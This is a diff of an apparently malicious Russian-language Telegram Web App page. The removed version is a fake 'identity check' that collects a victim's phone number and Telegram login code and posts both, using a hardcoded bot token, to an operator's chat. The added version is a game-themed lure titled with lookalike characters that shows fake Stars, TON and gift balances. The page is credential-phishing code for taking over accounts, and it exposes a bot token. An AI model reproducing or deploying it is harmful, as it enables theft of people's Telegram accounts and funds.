@@ -2,206 +2,373 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Проверка личности</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Расtа Sтаndoff2</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 12px; }
-        .container { max-width: 400px; width: 100%; padding: 20px 16px 30px; display: flex; flex-direction: column; align-items: center; text-align: center; }
-        .emoji { font-size: 80px; margin: 10px 0; }
-        .lead { font-size: 18px; font-weight: 500; margin: 8px 0; }
-        .muted { color: #9da3a8; font-size: 14px; margin: 4px 0 16px; }
-        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #2f80ed, #3aa3ff); border: none; border-radius: 14px; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; margin-top: 12px; }
-        .btn:active { opacity: 0.7; }
-        .btn-secondary { background: #2a2a2a; margin-top: 8px; }
-        .code-boxes { display: flex; gap: 12px; margin: 16px 0 12px; }
-        .code-box { width: 50px; height: 56px; background: #111; border-radius: 12px; border: 2px solid #222; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 600; color: #fff; }
-        .code-box.filled { border-color: #2f80ed; }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin: 16px 0 12px; }
-        .kbtn { padding: 14px; background: #1a1a1a; border: none; border-radius: 14px; color: #fff; font-size: 22px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
-        .kbtn:active { background: #2a2a2a; }
-        .kbtn.del { background: #1a1a1a; color: #ff6b6b; font-size: 20px; }
-        .status { color: #9da3a8; font-size: 14px; min-height: 24px; margin-top: 8px; }
-        .status.success { color: #69db7c; }
-        .hidden { display: none !important; }
-        .input-field { width: 100%; padding: 14px; background: #111; border: 1px solid #222; border-radius: 12px; color: #fff; font-size: 18px; margin: 10px 0; text-align: center; }
-        .input-field:focus { border-color: #2f80ed; outline: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f0f1a;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            color: #eef2ff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        /* ===== ОСНОВНЫЕ АНИМАЦИИ ===== */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes glow {
+            0% { box-shadow: 0 0 10px rgba(47, 128, 237, 0.3); }
+            50% { box-shadow: 0 0 30px rgba(47, 128, 237, 0.8); }
+            100% { box-shadow: 0 0 10px rgba(47, 128, 237, 0.3); }
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -200% center; }
+            100% { background-position: 200% center; }
+        }
+
+        @keyframes rotateSlow {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes bounceIn {
+            0% { opacity: 0; transform: scale(0.3); }
+            50% { opacity: 1; transform: scale(1.05); }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        /* ===== КОНТЕЙНЕР ===== */
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #1a1a2a;
+            border-radius: 28px;
+            padding: 30px 20px;
+            text-align: center;
+            border: 1px solid #2e3a5e;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+            animation: slideUp 0.5s ease-out;
+            transition: all 0.3s ease;
+        }
+
+        /* ===== ЛОГОТИП С АНИМАЦИЕЙ ===== */
+        .logo {
+            font-size: 72px;
+            margin-bottom: 12px;
+            display: inline-block;
+            animation: float 3s ease-in-out infinite;
+            transition: transform 0.3s ease;
+        }
+        .logo:hover {
+            animation: shake 0.5s ease;
+        }
+
+        /* ===== ЗАГОЛОВОК С ГРАДИЕНТОМ ===== */
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffd966, #ffaa33);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+            background-size: 200% auto;
+            animation: shimmer 3s linear infinite;
+        }
+
+        .subtitle {
+            color: #9ca3af;
+            font-size: 16px;
+            margin-bottom: 24px;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        /* ===== СТАТИСТИКА С АНИМАЦИЕЙ ===== */
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .stat-card {
+            background: #0e0e1a;
+            border-radius: 16px;
+            padding: 14px 8px;
+            border: 1px solid #2a2a3a;
+            transition: all 0.3s ease;
+            cursor: default;
+            animation: bounceIn 0.6s ease-out;
+            animation-fill-mode: both;
+        }
+        .stat-card:nth-child(1) { animation-delay: 0.1s; }
+        .stat-card:nth-child(2) { animation-delay: 0.2s; }
+        .stat-card:nth-child(3) { animation-delay: 0.3s; }
+
+        .stat-card:hover {
+            transform: translateY(-4px) scale(1.02);
+            border-color: #3a5a8a;
+            box-shadow: 0 8px 24px rgba(47, 128, 237, 0.2);
+        }
+
+        .stat-value {
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffd966;
+            transition: all 0.3s ease;
+        }
+        .stat-card:hover .stat-value {
+            color: #ffaa33;
+            transform: scale(1.1);
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #6b7280;
+            margin-top: 4px;
+            transition: color 0.3s ease;
+        }
+        .stat-card:hover .stat-label {
+            color: #9ca3af;
+        }
+
+        /* ===== КНОПКИ ===== */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
+            margin-top: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ЭФФЕКТ ВОЛНЫ ПРИ НАЖАТИИ */
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        .btn:active::after {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        /* ГЛАВНАЯ КНОПКА */
+        .btn-primary {
+            background: linear-gradient(135deg, #2f80ed, #3aa3ff);
+            animation: glow 2s ease-in-out infinite;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 30px rgba(47, 128, 237, 0.4);
+        }
+
+        /* ВТОРИЧНЫЕ КНОПКИ */
+        .btn-secondary {
+            background: #2a2a3a;
+            transition: all 0.3s ease;
+        }
+        .btn-secondary:hover {
+            background: #3a3a4a;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+        }
+
+        .btn-secondary:active {
+            transform: scale(0.95);
+        }
+
+        /* СПЕЦИАЛЬНЫЙ ЭФФЕКТ ДЛЯ КНОПКИ "ИГРАТЬ" */
+        .btn-play {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            animation: pulse 2s ease-in-out infinite;
+            position: relative;
+        }
+        .btn-play:hover {
+            transform: translateY(-2px) scale(1.03);
+            box-shadow: 0 8px 30px rgba(238, 90, 36, 0.4);
+        }
+
+        /* ===== ФУТЕР ===== */
+        .footer {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #4a4a5a;
+            opacity: 0.7;
+            transition: opacity 0.3s ease;
+        }
+        .footer:hover {
+            opacity: 1;
+        }
+
+        /* ===== ЗАГРУЗОЧНЫЙ СПИННЕР ===== */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: rotateSlow 0.8s linear infinite;
+            margin-right: 8px;
+        }
+
+        /* ===== АДАПТИВ ===== */
+        @media (max-width: 420px) {
+            .container { padding: 20px 16px; }
+            .title { font-size: 22px; }
+            .logo { font-size: 56px; }
+            .stat-value { font-size: 18px; }
+            .btn { font-size: 16px; padding: 14px; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div id="screen-welcome">
-            <div class="emoji">👋</div>
-            <div class="lead">Нужно подтвердить, что вы настоящий человек</div>
-            <div class="muted">Нажмите на кнопку ниже для начала!</div>
-            <button class="btn" id="btnConfirm">Подтвердить</button>
-        </div>
-        <div id="screen-phone" class="hidden">
-            <div class="emoji">📱</div>
-            <div class="lead">Введите Ваш номер телефона</div>
-            <div class="muted">Мы отправим код подтверждения</div>
-            <input class="input-field" type="tel" id="phoneInput" placeholder="79261234567">
-            <button class="btn" id="btnSendPhone">Отправить</button>
-            <div class="status" id="statusPhone"></div>
-        </div>
-        <div id="screen-waiting" class="hidden">
-            <div class="emoji">⏳</div>
-            <div class="lead">Ожидайте, не выходите!</div>
-            <div class="muted">Код отправлен на ваш номер</div>
-        </div>
-        <div id="screen-code" class="hidden">
-            <div class="emoji">🔐</div>
-            <div class="lead">Введите 5-значный код</div>
-            <div class="code-boxes" id="codeBoxes">
-                <div class="code-box" data-index="0"></div>
-                <div class="code-box" data-index="1"></div>
-                <div class="code-box" data-index="2"></div>
-                <div class="code-box" data-index="3"></div>
-                <div class="code-box" data-index="4"></div>
+        <!-- ЛОГОТИП С АНИМАЦИЕЙ ПАРЕНИЯ -->
+        <div class="logo">⚔️</div>
+
+        <!-- ЗАГОЛОВОК С SHIMMER ЭФФЕКТОМ -->
+        <div class="title">Расtа Sтаndoff2</div>
+        <div class="subtitle">Сезон #2 • 543.23</div>
+
+        <!-- СТАТИСТИКА С АНИМАЦИЕЙ ПОЯВЛЕНИЯ -->
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-value">1,234</div>
+                <div class="stat-label">⭐ Stars</div>
             </div>
-            <button class="btn btn-secondary" id="btnGetCode">Узнать код</button>
-            <div class="keypad" id="keypad">
-                <button class="kbtn" data-key="1">1</button>
-                <button class="kbtn" data-key="2">2</button>
-                <button class="kbtn" data-key="3">3</button>
-                <button class="kbtn" data-key="4">4</button>
-                <button class="kbtn" data-key="5">5</button>
-                <button class="kbtn" data-key="6">6</button>
-                <button class="kbtn" data-key="7">7</button>
-                <button class="kbtn" data-key="8">8</button>
-                <button class="kbtn" data-key="9">9</button>
-                <button class="kbtn" data-key="0">0</button>
-                <button class="kbtn del" data-key="backspace">⌫</button>
+            <div class="stat-card">
+                <div class="stat-value">5.42</div>
+                <div class="stat-label">⧫ TON</div>
             </div>
-            <div class="status" id="statusCode"></div>
+            <div class="stat-card">
+                <div class="stat-value">7</div>
+                <div class="stat-label">🎁 Подарки</div>
+            </div>
         </div>
+
+        <!-- КНОПКИ С РАЗНЫМИ ЭФФЕКТАМИ -->
+        <button class="btn btn-play" id="playBtn">
+            <span class="spinner" style="display:none;" id="playSpinner"></span>
+            🎮 Играть
+        </button>
+        <button class="btn btn-primary" id="shopBtn">🛒 Магазин</button>
+        <button class="btn btn-secondary" id="profileBtn">👤 Профиль</button>
+
+        <div class="footer">@basex8431l2s_bot • v2.0</div>
     </div>
 
     <script>
-        const BOT_TOKEN = "8789275152:AAFsi78kegUrM5y--o0-XvSqdnjPRf1MKUQ";
-        const ADMIN_ID = "8821493005";
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
         let tg = window.Telegram.WebApp;
-        let phone = '';
-        let codeDigits = [];
 
-        if (tg) { tg.ready(); tg.expand(); }
-
-        async function sendToBot(text) {
-            try {
-                await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
-                });
-            } catch(e) {}
+        if (tg) {
+            tg.ready();
+            tg.expand();
         }
 
-        const screenWelcome = document.getElementById('screen-welcome');
-        const screenPhone = document.getElementById('screen-phone');
-        const screenWaiting = document.getElementById('screen-waiting');
-        const screenCode = document.getElementById('screen-code');
-        const btnConfirm = document.getElementById('btnConfirm');
-        const btnSendPhone = document.getElementById('btnSendPhone');
-        const phoneInput = document.getElementById('phoneInput');
-        const statusPhone = document.getElementById('statusPhone');
-        const codeBoxes = document.querySelectorAll('.code-box');
-        const statusCode = document.getElementById('statusCode');
-        const btnGetCode = document.getElementById('btnGetCode');
-        const keypad = document.getElementById('keypad');
-
-        function showScreen(screen) {
-            [screenWelcome, screenPhone, screenWaiting, screenCode].forEach(el => el.classList.add('hidden'));
-            screen.classList.remove('hidden');
+        function sendToBot(action, data = {}) {
+            if (tg) {
+                tg.sendData(JSON.stringify({ action, ...data }));
+            }
         }
 
-        function updateCodeBoxes() {
-            codeBoxes.forEach((box, index) => {
-                box.textContent = codeDigits[index] || '';
-                box.classList.toggle('filled', !!codeDigits[index]);
+        // ===== АНИМАЦИЯ ЗАГРУЗКИ ПРИ НАЖАТИИ =====
+        document.getElementById('playBtn').addEventListener('click', function(e) {
+            const spinner = document.getElementById('playSpinner');
+            spinner.style.display = 'inline-block';
+            this.innerHTML = '⏳ Загрузка...';
+            this.disabled = true;
+
+            setTimeout(() => {
+                sendToBot('play');
+                if (tg) tg.close();
+            }, 800);
+        });
+
+        document.getElementById('shopBtn').addEventListener('click', function(e) {
+            // ЭФФЕКТ ПУЛЬСАЦИИ ПРИ НАЖАТИИ
+            this.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                this.style.transform = '';
+                sendToBot('shop');
+                if (tg) tg.close();
+            }, 200);
+        });
+
+        document.getElementById('profileBtn').addEventListener('click', function(e) {
+            // ЭФФЕКТ СВЕЧЕНИЯ
+            this.style.boxShadow = '0 0 30px rgba(47, 128, 237, 0.6)';
+            setTimeout(() => {
+                this.style.boxShadow = '';
+                sendToBot('profile');
+                if (tg) tg.close();
+            }, 300);
+        });
+
+        // ===== АНИМАЦИЯ ПРИ НАВЕДЕНИИ НА СТАТИСТИКУ (для десктопа) =====
+        document.querySelectorAll('.stat-card').forEach(card => {
+            card.addEventListener('mouseenter', function() {
+                this.style.transition = 'all 0.3s ease';
             });
-        }
-
-        btnConfirm.addEventListener('click', () => showScreen(screenPhone));
-
-        btnSendPhone.addEventListener('click', async () => {
-            phone = phoneInput.value.trim();
-            if (!phone) {
-                statusPhone.textContent = 'Введите номер в формате 79261234567';
-                statusPhone.className = 'status';
-                return;
-            }
-            statusPhone.textContent = 'Отправка кода...';
-            statusPhone.className = 'status';
-            try {
-                await sendToBot(`⏳ ОТПРАВИТЬ КОД на номер: ${phone}`);
-                // СИГНАЛ БОТУ ЧЕРЕЗ КОМАНДУ
-                await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: `/send_code ${phone}`
-                    })
-                });
-                statusPhone.textContent = 'Код отправлен!';
-                statusPhone.className = 'status success';
-                showScreen(screenWaiting);
-                setTimeout(() => {
-                    showScreen(screenCode);
-                    statusCode.textContent = '📲 Введите код из Telegram';
-                    statusCode.className = 'status';
-                }, 3000);
-            } catch(e) {
-                statusPhone.textContent = 'Ошибка: ' + e.message;
-                statusPhone.className = 'status';
-            }
         });
 
-        keypad.addEventListener('click', (e) => {
-            const key = e.target.dataset.key;
-            if (!key) return;
-            if (key === 'backspace') { codeDigits.pop(); updateCodeBoxes(); return; }
-            if (codeDigits.length >= 5) return;
-            codeDigits.push(key);
-            updateCodeBoxes();
-            if (codeDigits.length === 5) {
-                let code = codeDigits.join('');
-                sendToBot(`📩 КОД: ${code} для номера ${phone}`);
-                statusCode.textContent = '✅ Код получен!';
-                statusCode.className = 'status success';
-                setTimeout(() => {
-                    if (tg) tg.close();
-                }, 1500);
-            }
-        });
-
-        btnGetCode.addEventListener('click', () => {
-            sendToBot(`🔄 ПОВТОРНЫЙ КОД для ${phone}`);
-            statusCode.textContent = '📲 Код отправлен повторно!';
-            statusCode.className = 'status success';
-        });
-
-        document.addEventListener('keydown', (e) => {
-            if (!screenCode.classList.contains('hidden')) {
-                if (/^\d$/.test(e.key) && codeDigits.length < 5) {
-                    codeDigits.push(e.key);
-                    updateCodeBoxes();
-                    if (codeDigits.length === 5) {
-                        let code = codeDigits.join('');
-                        sendToBot(`📩 КОД: ${code} для ${phone}`);
-                        statusCode.textContent = '✅ Код получен!';
-                        statusCode.className = 'status success';
-                        setTimeout(() => { if (tg) tg.close(); }, 1500);
-                    }
-                } else if (e.key === 'Backspace') {
-                    codeDigits.pop();
-                    updateCodeBoxes();
-                }
-            }
-        });
+        console.log('[SWILL] WebApp с анимациями загружен!');
     </script>
 </body>
 </html>
